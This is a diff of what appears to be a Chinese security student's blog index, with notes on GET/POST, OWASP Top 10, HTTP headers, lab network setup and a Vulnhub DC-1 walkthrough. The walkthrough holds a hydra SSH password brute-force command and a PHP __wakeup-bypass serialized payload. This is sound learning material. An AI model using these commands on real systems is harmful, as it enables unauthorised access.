-<li>　　POST更安全（安全只是相对的，对于稍微会一点技术的人来说，拿bp或wireshark就可以看到POST传的数据，甚至还拍好了版。要更加安全还得https）</li>
-<li>　　GET更快</li>
-<li>　　POST可传递数据更多(GET因为浏览器等对URL的限制，传输数据大小有限)</li>
-<li>　　POST能发送更多的数据类型（GET只能发送ASCII字符）</li>
-<li>　　POST一般用于写入和修改数据，GET一般用于筛选和排序(如淘宝，支付宝的搜索查询都是get提交)，目的是资源的获取，读取数据</li>
-</ol>
-<p> </p>
-<p>POST为什么比GET慢。</p>
-<ul>
-<li>先看POST和GET的请求详细过程</li>
-</ul>
-<p>　　GET：</p>
-<p>　　<img src="1503868-20200130215157962-642488494.png" alt></p>
-<p> </p>
-<p> </p>
-<p> 　　POST：</p>
-<p>　　<img src="1503868-20200130215228345-1393262275.png" alt></p>
-<p> </p>
-<p> </p>
-<p>可以看到，POST在发送请求头给服务端，且得到服务端的确认后，才会发送请求数据。而GET直接在发送请求头的时候就把数据发送过去了</p>
-<ul>
-<li>POST因为需要在请求的body部分增加数据，所以会多了几个数据描述部分的首部字段（如：content-type）。但是这个影响比较小，影响速度的原因主要还是第一个。</li>
-<li>GET有缓存，POST没有缓存。在Chrome和FireFox下，如果检测到GET数据是静态资源，则会缓存，如果是数据，则不会</li>
-<li>针对GET有很多优化方案，然而这些在POST身上却不管用。比如管道通信，关于这个在<a class="link" href="https://blog.csdn.net/qq_28483283/article/details/80207674">https://blog.csdn.net/qq_28483283/article/details/80207674<i class="fas fa-external-link-alt"></i></a>这个帖子里讲得非常详细，想了解可以看这个。</li>
-</ul>
-<p> </p>
+    <title>OWASP Top10</title>
+    <url>/2021/05/12/OWASP-Top10/</url>
+    <content><![CDATA[<h1 id="A1-注入"><a href="#A1-注入" class="headerlink" title="A1 注入"></a>A1 注入</h1><p>  将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
+<h1 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h1><p>  通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
+<h1 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h1><p>  许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
+<h1 id="A4-XML外部实体（XXE）"><a href="#A4-XML外部实体（XXE）" class="headerlink" title="A4 XML外部实体（XXE）"></a>A4 XML外部实体（XXE）</h1><p>  许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
+<h1 id="A5-失效的访问控制"><a href="#A5-失效的访问控制" class="headerlink" title="A5 失效的访问控制"></a>A5 失效的访问控制</h1><p>  未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
+<h1 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h1><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
+<h1 id="A7-跨站脚本（XSS）"><a href="#A7-跨站脚本（XSS）" class="headerlink" title="A7 跨站脚本（XSS）"></a>A7 跨站脚本（XSS）</h1><p>  当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
+<h1 id="A8-不安全的反序列化"><a href="#A8-不安全的反序列化" class="headerlink" title="A8 不安全的反序列化"></a>A8 不安全的反序列化</h1><p>  不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
+<h1 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h1><p>  组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
+<h1 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h1><p>  不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
+<p>pdf： [OWASP Top 10 2017 4e2d65877248v1.0-2.pdf](......\0_IDM_Download\OWASP Top 10 2017 4e2d65877248v1.0-2.pdf) </p>
 ]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
   </entry>
   <entry>
     <title>PHP序列化入门</title>
@@ -1797,6 +1986,53 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>正常序列化对象后是这样的：↓</p>
 <p>构造序列化对象：O:5:”SoFun”:1:{S:7:”\00<em>\00file”;s:8:”flag.php”;}<br><br>绕过__wakeup：O:5:”SoFun”:<strong>2</strong>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}</p>
 </ul></li>]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>POST和GET的部分知识</title>
+    <url>/2020/01/30/POST%E5%92%8CGET%E7%9A%84%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12244175.html">源地址：https://www.cnblogs.com/This-is-Y/p/12244175.html<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="POST和GET的使用场景"><a href="#POST和GET的使用场景" class="headerlink" title="POST和GET的使用场景"></a>POST和GET的使用场景</h3><p>1.请求中包含数据更新等<strong>副作用</strong>时</p>
+<p>2.发送敏感信息时(防止Referer等安全隐患)</p>
+<p>3.发送的信息量很多时(URL长度有限，但是http协议并未规定get和post的长度限制，长度限制来源与浏览器与web服务器，而不同的浏览器和web服务器，限制的最大长度不一样)</p>
+<p>(副作用是指除了获取资源(内容)以外的其他作用,比如追加，更新，删除服务器段数据，购买商品，注册/删除用户等操作，换言之，<strong>更新类的页面必须使用POST方法</strong>)</p>
+<p> </p>
+<p>当发送的请求有上述其中一条以上时，应该使用POST</p>
+<p> </p>
+<p>POST和GET方法的优缺点：</p>
+<p>　　这里先放一篇写的很不错的博客链接：<a class="link" href="https://blog.csdn.net/qq_28483283/article/details/80207674">https://blog.csdn.net/qq_28483283/article/details/80207674<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　以及知乎一篇关于POST和GET的帖子：<a class="link" href="https://zhuanlan.zhihu.com/p/73475134">https://zhuanlan.zhihu.com/p/73475134<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　简单总结一下：</p>
+<ol>
+<li>　　POST更安全（安全只是相对的，对于稍微会一点技术的人来说，拿bp或wireshark就可以看到POST传的数据，甚至还拍好了版。要更加安全还得https）</li>
+<li>　　GET更快</li>
+<li>　　POST可传递数据更多(GET因为浏览器等对URL的限制，传输数据大小有限)</li>
+<li>　　POST能发送更多的数据类型（GET只能发送ASCII字符）</li>
+<li>　　POST一般用于写入和修改数据，GET一般用于筛选和排序(如淘宝，支付宝的搜索查询都是get提交)，目的是资源的获取，读取数据</li>
+</ol>
+<p> </p>
+<p>POST为什么比GET慢。</p>
+<ul>
+<li>先看POST和GET的请求详细过程</li>
+</ul>
+<p>　　GET：</p>
+<p>　　<img src="1503868-20200130215157962-642488494.png" alt></p>
+<p> </p>
+<p> </p>
+<p> 　　POST：</p>
+<p>　　<img src="1503868-20200130215228345-1393262275.png" alt></p>
+<p> </p>
+<p> </p>
+<p>可以看到，POST在发送请求头给服务端，且得到服务端的确认后，才会发送请求数据。而GET直接在发送请求头的时候就把数据发送过去了</p>
+<ul>
+<li>POST因为需要在请求的body部分增加数据，所以会多了几个数据描述部分的首部字段（如：content-type）。但是这个影响比较小，影响速度的原因主要还是第一个。</li>
+<li>GET有缓存，POST没有缓存。在Chrome和FireFox下，如果检测到GET数据是静态资源，则会缓存，如果是数据，则不会</li>
+<li>针对GET有很多优化方案，然而这些在POST身上却不管用。比如管道通信，关于这个在<a class="link" href="https://blog.csdn.net/qq_28483283/article/details/80207674">https://blog.csdn.net/qq_28483283/article/details/80207674<i class="fas fa-external-link-alt"></i></a>这个帖子里讲得非常详细，想了解可以看这个。</li>
+</ul>
+<p> </p>
+]]></content>
       <categories>
         <category>cnblogs</category>
       </categories>
@@ -1891,6 +2127,36 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>VirtualBox上的靶机与VMware kali网络问题</title>
+    <url>/2019/12/23/VirtualBox%E4%B8%8A%E7%9A%84%E9%9D%B6%E6%9C%BA%E4%B8%8EVMware%20kali%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12084588.html">源地址：https://www.cnblogs.com/This-is-Y/p/12084588.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>在Vulnhub上有许多靶机。其中有很多是在VirtualBox上运行的，而kali大多是使用Vmware</p>
+<p>打开kali，找到虚拟机网络设置</p>
+<img src="1503868-20191223163027008-226967397.png" alt>
+
+<p> </p>
+<img src="1503868-20191223163121461-1181037805.png" alt>
+
+<p> </p>
+<p> <img src="1503868-20191223163150522-798557590.png" alt></p>
+<p> </p>
+<p> 桥接模式</p>
+<p>这里几个选项，（自己记录一下）</p>
+<p>VirtualBox的DC-2虚拟机采用如下网络配置</p>
+<img src="1503868-20191223164132359-2094858340.png" alt>
+
+<p> </p>
+<p>Vmware下的aiweb-2采用和kali一样的桥接模式</p>
+<p>自动 -&gt; 可以扫到virtualBox的虚拟机，但是vmware的虚拟机扫不到</p>
+<p>Realtek PCIe GBE Family Controller，Sangfor SSL VPN CS Support System VNIXC，Microsoft Wi-Fi Direct Virtual Adapter和Microsoft Wi-Fi Direct Virtual Adapter #3  -&gt; 在使用arp-scan -l 时，提示my_lookupdev: no suitable device found</p>
+<p> VirtualBox Host-Only Ethernet Adapter -&gt; 不会有上面的情况，但是使用arp-scan -l 扫不到任何东西</p>
+<p>Qualcomm Atheros QCA61x4A Wireless Network Adapter -&gt; 可以扫到所有东西</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Vulnhub DC-1靶机渗透学习</title>
     <url>/2019/10/10/Vulnhub%20DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11637694.html">源地址：https://www.cnblogs.com/This-is-Y/p/11637694.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -1978,7 +2244,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p> </p>
 <p>也可以用kalissh远程登陆（推荐用这个，vmbox太tm蛋疼了）</p>
-<p>ssh <a class="link" href="mailto:&#x66;&#108;&#97;&#x67;&#x34;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x32;&#52;&#x2e;&#55;&#54;">&#x66;&#108;&#97;&#x67;&#x34;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x32;&#52;&#x2e;&#55;&#54;<i class="fas fa-external-link-alt"></i></a></p>
+<p>ssh <a class="link" href="mailto:&#102;&#108;&#x61;&#x67;&#x34;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#x2e;&#x37;&#54;">&#102;&#108;&#x61;&#x67;&#x34;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#x2e;&#x37;&#54;<i class="fas fa-external-link-alt"></i></a></p>
 <img src="1503868-20191008194735795-928890603.png" alt>
 
 <p> </p>
@@ -2034,7 +2300,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>做完这个感觉自己真的很菜，在此总结一下这个过程中了解到的，学到的，以及还不懂的知识</p>
 <p>1.arp-scan -l 　　用来扫描局域网内的主机。（参考<a class="link" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">https://blog.csdn.net/weixin_43221560/article/details/90550294<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>2.用 msf5来reach drupal寻找漏洞，配置并使用这些漏洞（一知半解，还得好好学习），</p>
-<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#x66;&#x6c;&#x61;&#x67;&#52;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#49;&#50;&#52;&#46;&#x37;&#x36;">&#x66;&#x6c;&#x61;&#x67;&#52;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#49;&#50;&#52;&#46;&#x37;&#x36;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
+<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#102;&#x6c;&#97;&#x67;&#x34;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#54;">&#102;&#x6c;&#97;&#x67;&#x34;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#54;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
 <p>4.john the Ripper +hydra 爆破，（john下载安装参考<a class="link" href="https://blog.csdn.net/Romanticduan/article/details/81233479">https://blog.csdn.net/Romanticduan/article/details/81233479<i class="fas fa-external-link-alt"></i></a>，使用参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/83373895">https://blog.csdn.net/qq_36119192/article/details/83373895<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76（也是一知半解，同样得学）</p>
 <p>5.suid提权</p>
@@ -2110,36 +2376,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p>1</p>
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>VirtualBox上的靶机与VMware kali网络问题</title>
-    <url>/2019/12/23/VirtualBox%E4%B8%8A%E7%9A%84%E9%9D%B6%E6%9C%BA%E4%B8%8EVMware%20kali%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12084588.html">源地址：https://www.cnblogs.com/This-is-Y/p/12084588.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>在Vulnhub上有许多靶机。其中有很多是在VirtualBox上运行的，而kali大多是使用Vmware</p>
-<p>打开kali，找到虚拟机网络设置</p>
-<img src="1503868-20191223163027008-226967397.png" alt>
-
-<p> </p>
-<img src="1503868-20191223163121461-1181037805.png" alt>
-
-<p> </p>
-<p> <img src="1503868-20191223163150522-798557590.png" alt></p>
-<p> </p>
-<p> 桥接模式</p>
-<p>这里几个选项，（自己记录一下）</p>
-<p>VirtualBox的DC-2虚拟机采用如下网络配置</p>
-<img src="1503868-20191223164132359-2094858340.png" alt>
-
-<p> </p>
-<p>Vmware下的aiweb-2采用和kali一样的桥接模式</p>
-<p>自动 -&gt; 可以扫到virtualBox的虚拟机，但是vmware的虚拟机扫不到</p>
-<p>Realtek PCIe GBE Family Controller，Sangfor SSL VPN CS Support System VNIXC，Microsoft Wi-Fi Direct Virtual Adapter和Microsoft Wi-Fi Direct Virtual Adapter #3  -&gt; 在使用arp-scan -l 时，提示my_lookupdev: no suitable device found</p>
-<p> VirtualBox Host-Only Ethernet Adapter -&gt; 不会有上面的情况，但是使用arp-scan -l 扫不到任何东西</p>
-<p>Qualcomm Atheros QCA61x4A Wireless Network Adapter -&gt; 可以扫到所有东西</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -2469,6 +2705,134 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>htttp协议部分笔记</title>
+    <url>/2020/02/05/htttp%E5%8D%8F%E8%AE%AE%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12256079.html">源地址：https://www.cnblogs.com/This-is-Y/p/12256079.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>**报文：　**　</p>
+<p><strong>http请求报文：</strong></p>
+<p>基本格式</p>
+<p>　　<img src="1503868-20200205111708601-107755887.png" alt width="651" height="271"></p>
+<p> 请求行：这里那有道翻译的网页用一下（应该没啥关系吧）</p>
+<p>　　<img src="1503868-20200205155437106-1447717939.png" alt></p>
+<p> 　　请求行由3部分组成，请求方法，请求URL，HTTP协议版本。</p>
+<p>　　　　<strong>方法</strong>：最常见的有GET，POST，请求方法一定是要大写　　　　　　</p>
+<p>HTTP/1.0和HTTP/1.1支持的方法：</p>
+<img src="1503868-20200203143502218-550940739.png" alt width="598" height="308">
+
+<p> 但因为安全隐患等原因，用的最多的还是POST和GET，关于POST和GET：<a class="link" href="https://www.cnblogs.com/This-is-Y/p/12244175.html">https://www.cnblogs.com/This-is-Y/p/12244175.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　　　　　 <strong>URL</strong>：URI（Uniform Resource Identifier）：统一资源标识符</p>
+<p>URL（Uniform Resource Locator）：统一资源定位符</p>
+<p>URL是URI的子集，URL是一种具体的URI。</p>
+<p>较为经典的URI</p>
+<img src="1503868-20200203134002377-1332556046.png" alt width="559" height="114">
+
+<p>协议有http，https，ftp 等</p>
+<p>登陆认证信息一般出现得较少</p>
+<p>　　　　　　<strong>协议版本：</strong>最初的版本HTTP/0.9，然后是HTTP/1.0，再之后是将持久连接改为默认的HTTP/1.1，这是最主流的HTTP协议版本。再到现在的的HTTP/2.0，这个用的不多。</p>
+<p> </p>
+<p><strong>http响应报文：</strong></p>
+<p>基本格式</p>
+<img src="1503868-20200203135421531-427205203.png" alt width="577" height="369">
+
+<p><strong>响应码：</strong> 有2xx，3xx，4xx，5xx这几大类，其中1xx表示信息性状态码，接受的请求正在处理。2xx表示成功，请求正常处理完毕。3xx多表示重定向，需要进行附加操作完成请求。4xx多表示失败（客户端），服务器无法处理请求。5xx同样表示失败（服务端），服务器处理请求出错。</p>
+<p>1xx：有100  Continue，表示继续。101  Switching Protocol，切换协议。1xx响应码很少见，</p>
+<p>2xx：最常见的是200  OK，表示请求正常处理。  204  No Content 没有内容，一般在需要客户端发送信息而服务端不需要返回<strong>新</strong>信息内容时出现（一般在一个网页按F5刷新，看似什么都没有发生，实际上浏览器发送了请求，而此时响应码就是204）。  206 Partial Content 请求并发送部分内容，一般出现在发送内容过大时，在首部字段中使用range头对文件进行分块发送（当浏览一些较大的图片，PDF时会出现）</p>
+<p>3xx：301 Moved Permanently 永久移动，即重定向，当前全球的资源分配了新的URI（可以在首部字段中找到Location字段找到新的URI）。302 Found 临时移动 ，在防火墙认证时经常用到。与302一起出现的还有  303 See Other 查看其他位置 ，在302跳转认证成功了，就会出现303 see other，这个表示由于请求对应的资源存在另一个URI，应使用GET方法定向获取请求的资源（303状态码明确表示用户应该使用GET方法获取资源。）304 Not Modified 未修改，告诉客户端,所请求的内容距离上次访问并没有变化. 客户端可以直接从浏览器缓存里获取该资源（304是3xx里面和重定向没关系的一个）。307  Temporary Redirect  临时重定向 ，和302类似，但307更为严谨，不会从POST变成GET，302尽管禁止POST变换成GET，但是大多数人并不遵守。关于重定向，还有一个META Redirect，只需要在html的head里写上&lt;meta http-equiv=”refresh” content=”5;URL=新的URL”&gt;  content里面的5代表延迟时间5s，这样操作返回的响应码是200 OK<br>4xx：400 Bad Request 错误请求，发送的URL有错误，比如无法正确转码什么的。401 Unauthorized 未认证，在打开一个网页时弹出窗口需要你认证身份。403 Forbidden 禁止访问  ,权限不足，无法访问请求的文件。404 Not Found 喜闻乐见的一个状态码，这个不需要多说了，访问文件不存在。<br>5xx：500 Internal Server Error  内部服务器错误，一般是阿帕奇服务器出现问题。503 Service Unavailable 服务不可用，服务器出现超负载或者正在停机维护。</p>
+<p>　　这里我只说一小部分响应码，响应码总结大全：<a class="link" href="https://www.cnblogs.com/isykw/p/6115469.html">https://www.cnblogs.com/isykw/p/6115469.html<i class="fas fa-external-link-alt"></i></a> 。</p>
+<p> </p>
+<p>首部字段细分：<br>　　 通用首部字段：在请求报文和响应报文中都可能出现</p>
+<p>请求首部字段：只在请求报文中出现</p>
+<p>响应首部字段：只在响应报文中出现</p>
+<p>实体首部字段：和实际传输数据相关的参数。</p>
+<p>其他</p>
+<p> </p>
+<p><strong>通用首部字段：</strong></p>
+<img src="1503868-20200205130853547-1458158193.png" alt width="658" height="411">
+
+<p>　　Cache-Control：缓存控制，是否使用缓存</p>
+<p>　　Connection：持久连接，后文有详细提到，有Keep-Alive ，close等值</p>
+<p>　　Keep-Alive：控制连接断开条件，timeout（超时时间），max请求次数极大值</p>
+<p>　　Date：HTTP报文产生日期</p>
+<p>　　Transfer-Encoding：传输报文主体采用的编码方式，chunked（分段式编码）</p>
+<p>　　Upgrade：检测协议或是否可以使用更高版本协议进行通信（不太懂）</p>
+<p>　　Warning：警告。[警告码][警告主机：端口号][警告内容]（[警告时间]（可省略））</p>
+<p><strong>请求首部字段：</strong></p>
+<p>　　　　<img src="1503868-20200205135524987-1420334523.png" alt></p>
+<p> </p>
+<p> </p>
+<p>　　　　Accept：告知服务器用户代理能够处理的媒体类型及媒体类型的相对优先级 ，如text/plain;q=0.3,text/htm;q=0.4,  不同的文件类型用 ‘ , ‘  分隔，q的值未权重，0~1，可精确到小数点后3位，默认值位1.0。服务器提供多种内容时，优先返回权重值高的媒体类型。</p>
+<p>　　　　　　　　文本文件：text/html，text/plain，text/css……</p>
+<p>　　　　　　　　　　　　　application/xml，application/xhtml+xml……</p>
+<p>　　　　　　　　图片文件：image/jpeg，image/gif，image/png……</p>
+<p>　　　　　　　　视频文件：video/mpeg，video/quicktime……</p>
+<p>　　　　　　　　应用程序使用的二进制文件：application/octet-stream，application/zip……</p>
+<p>   　　　Accept-Charset：可接受的字符集，像utf-8等。同样有优先级</p>
+<p>　　　　Accept-Encoding：告知服务器用户代理支持的内容编码以及内容编码的优先级，gzip，deflate等</p>
+<p>　　　　　　　　gzip：由文件压缩程序gzip（GNU zip）生成的编码格式（RFC1952）</p>
+<p>　　　　　　　　compress：由UNIX压缩程序compress生成的编码格式</p>
+<p>　　　　　　　　deflate：组合使用zlib格式（RFC1950）及由deflate压缩算法（RFC951）生成的编码格式</p>
+<p>　　　　　　　　identity：不执行亚索或不会变化的默认编码格式</p>
+<p>　　　　Accept-Language：告知服务器用户代理能够处理的自然语言集（指中文或英文等），如zh/cn,zh;q=0.9,en-us;q=0.6，同样有优先级</p>
+<p>　　　　Authorization：告知服务器用户的认证信息（证书值），出现401响应码时会出现这个字段</p>
+<p>　　　　Host：告知服务器请求的资源所处的互联网主机名和端口号，Host是HTTP/1.1规范内唯一一个必须被包含在请求内的首部字段。Host和以单台服务器分配多个域名的虚拟主机的工作机制有密切的关系</p>
+<p>　　　　Referer：告知服务器请求的原始资源的URI。相当于告诉服务器我是从哪里过来的，可用于防止盗链，同时有一定安全隐患。Referer的中文意思是推荐人。</p>
+<p>　　　　User-Agent：发送创建请求的浏览器，系统，IP和用户代理名称等信息给服务器，检查User-Agent是一种最简单的反爬手段，与之对应的可以通过fake-useragent库来反反爬。同时也可以使用burpsuite来修改User-Agent。</p>
+<p>　　　<strong>响应首部字段：</strong></p>
+<p>**　　　　<img src="1503868-20200205154342421-1762077444.png" alt width="611" height="380">**</p>
+<p>　　　　Location：出现重定向时，告知客户端新的URL　</p>
+<p> </p>
+<p> 　　　   Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息，有安全隐患，会暴露apache服务器，openssl，PHP的版本和操作系统等信息。可通过以下方法解决</p>
+<p>　　　　　<img src="1503868-20200205155053585-767915234.png" alt width="510" height="84"></p>
+<p> </p>
+<p> </p>
+<p> 　　　　WWW-Authorizate：和401有关，告知客户端需要做认证</p>
+<p>　　　<strong>实体首部字段：</strong></p>
+<p>**　　　　<img src="1503868-20200205160107818-1373089464.png" alt width="527" height="369">**</p>
+<p> </p>
+<p> </p>
+<p> 　　　　Content-Length：实体主体部分的大小（以字节为单位）</p>
+<p>　　　　 Content-Type：表示报文主体对象类型，常见的是text/html </p>
+<p>　　　　 Allow：用于通知客户端获取指定资源可使用的所有HTTP方法，当接收到不支持的方法时，会返回405 Method Not Allowed。同时，还会把所有能支持的HTTP方法写入Allow字段后返回　</p>
+<p>　　　　 Content-Encoding：告知客户端服务器对实体的主体部分的编码方式（如gzip等）</p>
+<p>　　　　 Content-Language：告知客户端服务器发送的实体主体使用的自然语言</p>
+<p>　　　　 Content-Location：表示报文主题返回资源对应的URI。比如访问一个英文页面，但是请求Accept-Language要求的是中文，就返回一个中文页面给客户端，返回的这个中文页面的URL，就在Content-Location字段里（暂时没找到合适的例子，找到了，我记得的话就补充一下）</p>
+<p>　　　　 Content-Type：说明了实体主体内对象的媒体类型，和Accept一样，用type/subtype的形式赋值。防火墙限制下载部分类型文件，就是从这里找数据</p>
+<p>　　　　 Expires：缓存的存活时间</p>
+<p><strong>其他：</strong></p>
+<p>**　　**为cookie服务的字段：</p>
+<p>　　　　set-cookie：参数（值，存活时间（expires），路径（path），域名（domain），（secure），（HttpOnly））</p>
+<p>　　　　　　值：就是cookie的值。</p>
+<p>　　　　　　expires：cookis可以使用多长时间</p>
+<p>　　　　　　domain：假如设置域名为  .thisisy.com 那么该cookie可以发给<a class="link" href="http://www.thisisy.com,也可以发给mail.thisisy.com等等,存在安全隐患,建议不要设置/">www.thisisy.com,也可以发给mail.thisisy.com等等，存在安全隐患，建议不要设置<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　　　　　path：和域名原理一样，也是建议不要设置（关于path和domain的详解，看这里：<a class="link" href="https://www.jb51.net/article/44561.htm">https://www.jb51.net/article/44561.htm<i class="fas fa-external-link-alt"></i></a>）</p>
+<p>　　　　　　secure：设置该参数，则该cookie只能在建立HTTPS的安全连接下才可以发送cookie</p>
+<p>　　　　　　HttpOnly：使js脚本无法获得cookie，主要用于防止xss攻击对cookie的窃取</p>
+<p> 同样，首部字段与主体之间要留有空行，主体就是网页html源码</p>
+<p> </p>
+<p>http是不保存状态的协议，即<strong>无状态协议</strong>，http协议不对请求和响应之间的通信状态做保存，也就是说，在http这个级别，协议对于已经发送过的请求或响应都不做持久化处理。只是为了<strong>更快的处理大量事物</strong>，确保协议的可伸缩性，而特意把http协议设计得如此简单。而有些时候需要对请求或响应做保存，这时候就出现了隐含参数和cookie</p>
+<p> </p>
+<p><strong>哑服务：</strong></p>
+<p>关于http协议的瞬时性，原始版本http都是建立建立，发送请求，接受响应，连接断开。这样一个过程。但是这个过程在大型网页中非常消耗资源（大量资源都用在了建立三次握手上）。</p>
+<img src="1503868-20200203144646291-544286251.png" alt>
+
+<p>后来提出了持久连接，只要任意一端没有提出断开连接，连接就会一直存在。在http/1.0中，默认关闭，需要在http头中加入”Connection:Keep-Alive”开启持久连接，在http/1.1中，持久连接变成默认开启，在http头中加入”Connection:close”才会关闭。于是整个过程就变成了建立连接，发送请求，接受响应，发送请求，接受响应…………直到断开连接，就像一个人坐一趟列车在两个地方来回走，必须到达A城才可以去B城，到了B城才能再回A城，</p>
+<img src="1503868-20200203144608207-1697778574.png" alt>
+
+<p>但是人们发现这样还不够快，于是出现了管道化，在前面持久连接的基础上，发送一次请求后，不等接受响应，直接发送第二个请求，就像两根管子，分别处理发送的请求与接受的响应</p>
+<img src="1503868-20200203144452571-280682539.png" alt>
+
+<p><strong>cookie：</strong></p>
+<p>**　　**Cookie是一段不超过4KB的小型文本数据，由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。</p>
+<p> </p>
